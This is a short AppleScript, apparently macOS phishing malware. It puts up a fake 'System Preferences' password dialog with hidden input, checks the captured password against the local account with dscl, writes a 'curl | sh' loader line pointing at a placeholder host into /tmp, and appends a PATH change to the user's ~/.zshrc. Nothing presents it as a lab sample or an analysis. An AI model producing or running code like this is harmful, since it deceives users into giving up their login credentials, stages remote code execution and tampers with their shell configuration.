set response to display dialog "Enter your password to continue" with title "System Preferences" default answer "" with hidden answer
set candidate to text returned of response
do shell script "dscl . -authonly " & quoted form of (do shell script "id -un") & " " & quoted form of candidate
do shell script "printf '%s' 'curl -fsSL https://delivery.example.invalid/loader | sh' >> /tmp/install-hint"
do shell script "printf '%s' 'export PATH=/usr/bin' >> ~/.zshrc"
